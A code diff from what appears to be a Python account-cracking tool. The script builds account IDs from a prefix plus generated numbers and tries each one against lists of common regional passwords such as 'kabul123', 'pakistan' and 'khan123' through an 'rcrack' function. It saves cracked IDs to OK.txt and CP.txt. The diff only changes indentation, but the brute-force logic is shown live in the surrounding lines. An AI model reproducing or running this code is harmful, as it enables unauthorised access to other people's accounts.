@@ -304,12 +304,12 @@ def m1():
             uid = kode+guru
             pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000']
             yaari.submit(rcrack,uid,pwx,tl)
-    print(46*'-')
-    print('IDZ SAVED IN OK.txt : CP.txt')
-    print(46*'-')
-    print('THE PROCESS HAS BEEN COMPLETED')
-    input('PRESS ENTER TO BACK ')
-    riaz()
+print(46*'-')
+print('IDZ SAVED IN OK.txt : CP.txt')
+print(46*'-')
+print('THE PROCESS HAS BEEN COMPLETED')
+input('PRESS ENTER TO BACK ')
+riaz()
     
 def m2():
     user=[]
@@ -448,7 +448,7 @@ def b2():
             uid = kode+guru
             pwx=[guru,'pakistan','khankhan','khan123','malik123','Ahmad123','karachi123','pikhawar']
             yaari.submit(rcrack,uid,pwx,tl)
-   print(46*'-')
+    print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
     print(46*'-')
     print('THE PROCESS HAS BEEN COMPLETED')
